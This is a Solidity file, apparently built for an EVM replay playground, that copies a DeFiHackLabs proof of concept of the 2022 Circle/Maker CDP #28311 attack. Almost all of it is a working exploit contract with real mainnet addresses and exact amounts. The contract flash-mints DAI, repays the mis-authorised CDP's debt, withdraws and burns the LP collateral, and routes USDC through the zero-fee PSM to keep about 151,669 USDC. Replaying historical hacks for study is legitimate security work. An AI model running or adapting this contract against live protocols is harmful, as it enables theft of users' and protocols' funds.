// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2022-08-Circle_exp2).
//
// The DeFiHackLabs PoC (test/Circle_exp2.sol) runs the attack INLINE in the
// Foundry test contract: the test IS the Maker flash-loan receiver, and the
// whole close-CDP → burn-LP → PSM-sellGem sequence happens inside onFlashLoan.
// There is no standalone exploit contract to deploy. This file is a faithful,
// self-contained copy of that inline attack so the playground can record it.
//
// The exploit is ETCHED at the historical attack-contract address
// 0xfd51531B26f9bE08240f7459EeA5BE80D5B047D9, which holds the CDP-manager
// authority over CDP #28311 (`cdpAllow(28311, 0xfd51…, 1)` granted before the
// attack). In the Foundry test this authority is borrowed via two `vm.prank`
// calls around manager.frob / manager.flux; by running the whole exploit AT
// that address, msg.sender is naturally 0xfd51… and no prank is needed. Logic
// and constants are copied verbatim from test/Circle_exp2.sol.
//
// Root cause: a mis-administered, over-collateralized CDP (#28311, ilk
// UNIV2DAIUSDC-A) whose authority had been granted to an attacker-controlled
// address. The attacker flash-mints DAI, repays the CDP debt for free, pulls
// the LP collateral, burns it for DAI+USDC, and converts the USDC half to DAI
// through the zero-fee PSM (DssPsm.sellGem, tin=0) — repaying the flash loan
// and keeping ~151,669 USDC of over-collateralization as pure profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IMakerPool {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

struct Urn {
    uint256 ink; // Locked Collateral  [wad]
    uint256 art; // Normalised Debt    [wad]
}

interface IMakerVat {
    function urns(bytes32, address) external view returns (Urn memory);
    function ilks(bytes32) external view returns (uint256 Art, uint256 rate, uint256 spot, uint256 line, uint256 dust);
}

interface IMakerManager {
    function urns(uint256) external view returns (address);
    function flux(uint256, address, uint256) external;
    function frob(uint256, int256, int256) external;
}

interface IGemJoin {
    function exit(address, uint256) external;
}

interface IUniswapV2Pair {
    function burn(address) external returns (uint256, uint256);
}

interface IDssPsm {
    function sellGem(address, uint256) external;
}

contract CircleExploit {
    // --- mainnet constants (verbatim from test/Circle_exp2.sol) ---
    address private constant MAKER_FLASH = 0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private constant MAKER_CDP_MANAGER = 0x5ef30b9986345249bc32d8928B7ee64DE9435E39;
    address private constant MCD_JOIN_DAI = 0x9759A6Ac90977b93B58547b4A71c78317f391A28;
    address private constant MCD_VAT = 0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B;
    address private constant GEM_JOIN = 0xA81598667AC561986b70ae11bBE2dd5348ed4327; // UNIV2DAIUSDC-A adapter
    address private constant UNIV2_DAI_USDC = 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5; // LP token / pair
    address private constant DSS_PSM = 0x89B78CfA322F6C5dE0aBcEecab66Aee45393cC5A;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant AUTH_GEM_JOIN5 = 0x0A59649758aa4d66E25f08Dd01271e891fe52199; // PSM USDC adapter

    // ilk UNIV2DAIUSDC-A (bytes32 from the test)
    bytes32 private constant ILK = 0x554e495632444149555344432d41000000000000000000000000000000000000;

    // CDP #28311 whose authority was granted to this contract's address.
    uint256 private constant CDP_ID = 28_311;
    // Flash-mint amount = the CDP's outstanding DAI debt (art × rate / RAY).
    uint256 private constant FLASH_AMOUNT = 7_313_820_511_466_897_574_539_490;
    // USDC to route through the zero-fee PSM: sized so the recombined DAI exactly
    // repays the flash loan, leaving the residual USDC as profit.
    uint256 private constant SELL_GEM_USDC = 3_580_348_695_472;
    // Maker flash callback return value (keccak256("ERC3156FlashBorrower.onFlashLoan")).
    bytes32 private constant FLASH_CALLBACK = 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;

    // step 0: flash-mint DAI from the Maker flash module; the callback does the attack.
    function run() external {
        // bytes data encodes cdpId (28311) + 0, as in the test.
        bytes memory data =
            "0x0000000000000000000000000000000000000000000000000000000000006e970000000000000000000000000000000000000000000000000000000000000000";
        IMakerPool(MAKER_FLASH).flashLoan(address(this), DAI, FLASH_AMOUNT, data);
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        address urnsAddress = IMakerManager(MAKER_CDP_MANAGER).urns(CDP_ID);
        Urn memory urn = IMakerVat(MCD_VAT).urns(ILK, urnsAddress);

        int256 dink = 0 - int256(urn.ink);
        int256 dart = 0 - int256(urn.art);

        // Deposit the flash-minted DAI into the Vat for the urnHandler.
        uint256 amountDai = IERC20(DAI).balanceOf(address(this));
        IERC20(DAI).approve(MCD_JOIN_DAI, amountDai);
        // Note: the test calls IMakerManager(MCD_JOIN_DAI).join — DaiJoin.join.
        IMakerJoinLike(MCD_JOIN_DAI).join(urnsAddress, amountDai);

        // Repay debt & unlock collateral (msg.sender == this contract == the
        // authorized operator of CDP #28311 — replaces the test's vm.prank).
        IMakerManager(MAKER_CDP_MANAGER).frob(CDP_ID, dink, dart);
        // Move the freed collateral to this contract inside the Vat.
        IMakerManager(MAKER_CDP_MANAGER).flux(CDP_ID, address(this), urn.ink);
        // Pull the LP token out of the Vat.
        IGemJoin(GEM_JOIN).exit(address(this), urn.ink);

        // Burn the LP for both underlying assets.
        IERC20(UNIV2_DAI_USDC).transfer(UNIV2_DAI_USDC, urn.ink);
        IUniswapV2Pair(UNIV2_DAI_USDC).burn(address(this));

        // Convert the USDC half to DAI through the zero-fee PSM.
        IERC20(USDC).approve(AUTH_GEM_JOIN5, type(uint256).max);
        IDssPsm(DSS_PSM).sellGem(address(this), SELL_GEM_USDC);

        // Approve the flash module to pull the DAI back at the end of the tx.
        IERC20(DAI).approve(MAKER_FLASH, type(uint256).max);
        return FLASH_CALLBACK;
    }
}

// Minimal interface for DaiJoin.join (the test casts MCD_JOIN_DAI to IMakerManager
// and calls .join(addr, uint); DaiJoin exposes join(address,uint)).
interface IMakerJoinLike {
    function join(address, uint256) external;
}
